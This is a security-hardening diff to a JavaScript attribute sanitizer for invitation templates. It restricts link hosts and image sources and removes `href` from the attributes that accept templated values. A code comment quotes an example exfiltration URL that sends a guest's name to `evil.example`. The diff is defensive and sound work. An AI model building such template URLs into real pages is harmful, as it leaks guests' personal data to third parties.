@@ -39,10 +39,31 @@ export const BEHAVIOR_VALUES = {
 /** Parallax strengths: fraction of the distance to the viewport centre. */
 export const PARALLAX = { subtle: 0.06, soft: 0.12, medium: 0.2 }
 
-/** Attributes whose value may come from a variable template. */
-export const VAR_ATTRS = new Set(['alt', 'aria-label', 'title', 'href'])
+/**
+ * Attributes whose value may come from a variable template. Never `href`, `src` or `srcset`: a variable there could
+ * compose `https://evil.example/?n={{guest.name}}` and leak the guest's name or phone (W6-10, same as the server).
+ */
+export const VAR_ATTRS = new Set(['alt', 'aria-label', 'title'])
 
 const noCredentials = href => (href && !/^https:\/\/[^/]*@/.test(href) ? href : null)
+
+/** Hosts a guest should never be sent to from an invitation: localhost, IP literals, single-label and internal names. */
+export function isPublicHost(hostname) {
+  const host = String(hostname).toLowerCase().replace(/\.$/, '')
+  if (!host || host.startsWith('[') || host.includes(':')) return false // IPv6 literal
+  if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host) || /^(0x[0-9a-f]+|\d+)$/.test(host)) return false // IPv4 literal, also hex/decimal forms
+  if (!host.includes('.')) return false
+  return !/(^|\.)(localhost|local|internal|intranet|lan|home|corp|arpa)$/.test(host)
+}
+
+const publicHttps = href => {
+  if (!href) return null
+  try {
+    return isPublicHost(new URL(href).hostname) ? href : null
+  } catch {
+    return null
+  }
+}
 
 const SECTION_ANCHORS = /^#(pkg-[a-z0-9-]{1,40}|cover|itinerary|locations|dress_code|padrinos|gallery|rsvp|music|closing|countdown|save_the_date)$/
 
@@ -53,18 +74,34 @@ export function safeLink(value) {
   if (SECTION_ANCHORS.test(v)) return v
   if (/^mailto:[A-Za-z0-9._%+-]{1,64}@[A-Za-z0-9.-]{1,120}$/.test(v)) return v
   if (/^tel:\+?[0-9]{5,15}$/.test(v)) return v
-  return noCredentials(safeHttpsUrl(v))
+  return noCredentials(publicHttps(safeHttpsUrl(v)))
 }
 
-/** Package files (`assets/…`, resolved against the package base URL), internal paths and https images. */
-export function safeSrc(value, base) {
-  if (typeof value !== 'string') return null
+const ASSET_PATH = /^assets\/[a-z0-9][a-z0-9._/-]{0,120}$/
+
+/** `assets/…` of the package resolved against its base URL, or null. */
+export function packageAsset(value, base) {
+  if (typeof value !== 'string' || !base) return null
   const v = value.trim()
-  if (/^assets\/[a-z0-9][a-z0-9._/-]{0,120}$/.test(v) && !v.includes('..') && !v.includes('//')) {
-    return base ? base + v : null
+  return ASSET_PATH.test(v) && !v.includes('..') && !v.includes('//') ? base + v : null
+}
+
+/** Images are package files only (`assets/…` resolved against the package base): no arbitrary https, no paths. */
+export function safeSrc(value, base) {
+  return packageAsset(value, base)
+}
+
+/** `srcset`: `assets/… 480w, assets/… 2x` candidates, each resolved against the package base. */
+export function safeSrcset(value, base) {
+  if (typeof value !== 'string' || value.length > 1200) return null
+  const out = []
+  for (const candidate of value.split(',').slice(0, 6)) {
+    const m = candidate.trim().match(/^(\S+)(?:\s+(\d{2,4}w|\d(?:\.\d)?x))?$/)
+    const url = m && packageAsset(m[1], base)
+    if (!url) return null
+    out.push(m[2] ? `${url} ${m[2]}` : url)
   }
-  if (/^\/(?![/\\])[^\s\\]{0,300}$/.test(v)) return v
-  return noCredentials(safeHttpsUrl(v))
+  return out.length ? out.join(', ') : null
 }
 
 /** Classes must be the package's own (`pkg-*`): a Tailwind utility like `fixed inset-0` must never be reachable. */
@@ -117,7 +154,7 @@ export function cleanAttr(tag, name, value, base) {
   if (tag === 'a' && name === 'target') return v === '_blank' ? '_blank' : undefined
   if (tag === 'img') {
     if (name === 'src') return safeSrc(v, base) ?? undefined
-    if (name === 'srcset') return /^[\w:/.%,\s-]{1,1200}$/.test(v) ? v : undefined
+    if (name === 'srcset') return safeSrcset(v, base) ?? undefined
     if (name === 'sizes') return /^[a-z0-9 ().,:%vwh-]{1,200}$/i.test(v) && !/url/i.test(v) ? v : undefined
     if (name === 'alt') return v.slice(0, 200)
     if (name === 'width' || name === 'height') return int(v, 1, 4096) ?? undefined
